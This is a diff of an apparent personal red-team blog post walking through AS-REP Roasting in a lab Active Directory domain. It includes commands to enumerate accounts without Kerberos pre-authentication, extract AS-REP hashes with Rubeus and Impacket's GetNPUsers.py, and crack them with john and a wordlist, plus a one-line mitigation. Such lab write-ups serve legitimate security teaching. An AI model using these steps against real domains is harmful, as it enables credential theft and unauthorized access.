@@ -1,10 +1,10 @@
 ---
-title:  "Kerberos attacks 1-AS-REP Roasting "
+title:  "Kerberos attacks 2-AS-REP Roasting "
 classes: wide
 header:
   teaser: /img/redteampng.png
 ribbon: red
-description: "Kerberos attacks 1-AS-REP Roasting"
+description: "Kerberos attacks 2-AS-REP Roasting"
 categories:
   - Red-Teaming
 toc: true
@@ -30,9 +30,38 @@ TGT: Ticket Granting Ticket  # A userbased ticket used to authenticate to the KD
 ST: Service Ticket           # Used to authenticate against services
 SPN: Service Principal Name  #The name of a service on the network
 ```
+
+
+##  enumerate User account with "Do not require pre-authentication"
+```
+Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+```
+
+<img src="/img/asrep/enum.png" alt="Getting-gz" width="1000" height="200"> 
+
+```
+Get-DomainUser -PreauthNotRequired -verbose| select name
+```
+
+<img src="/img/asrep/enum1.png" alt="Getting-gz" width="1000" height="200"> 
+
 ## ASREP Roasting with Impacket
 
-## ASREP Roasting with Rubeus
+```
+Rubeus.exe asreproast
+```
+
+<img src="/img/asrep/rubeus.PNG" alt="Getting-gz" width="1000" height="200"> 
+
+saved the extracted hash in the john crackable format inside a text file
+```
+Rubeus.exe asreproast /format:john /outfile:hash.txt
+```
+
+<img src="/img/asrep/save.png" alt="Getting-gz" width="1000" height="200"> 
+
+## ASREP Roasting with ASREPRoast PowerShell Script
+
 
 
 
@@ -49,20 +78,26 @@ Get-DomainUser | select name
 ```
 python3 GetNPUsers.py karim.net/ -usersfile  users.txt -dc-ip 192.168.128.140
 ```
+
 <img src="/img/asrep/users10.png" alt="Getting-gz" width="1000" height="200"> 
 
-
- ```
- python3 GetNPUsers.py karim.net/asrepuser -dc-ip 192.168.128.140
- ```
- <img src="/img/asrep/kali.png" alt="Getting-gz" width="1000" height="200"> 
- 
- ## crack hash with john
- 
- ```
- john tgt.txt -w=/usr/share/wordlists/rockyou.txt
+```
+python3 GetNPUsers.py karim.net/asrepuser -dc-ip 192.168.128.140
 ```
 
- <img src="/img/asrep/crack.png" alt="Getting-gz" width="1000" height="200"> 
- I finished part 1 in Kerberos attacks today waite me in the next part.
+<img src="/img/asrep/kali.png" alt="Getting-gz" width="1000" height="200"> 
+ 
+## crack hash with john
+ 
+ ```
+john tgt.txt -w=/usr/share/wordlists/rockyou.txt
+```
+
+<img src="/img/asrep/crack.ng" alt="Getting-gz" width="1000" height="200"> 
+
+## AS-REP roasting Mitigation
+* ensure that no users within the Active Directory domain have Pre-authentication disabled (it is enabled by default).
+
+I finished part 2 in Kerberos attacks today waite me in the next part.
+
 
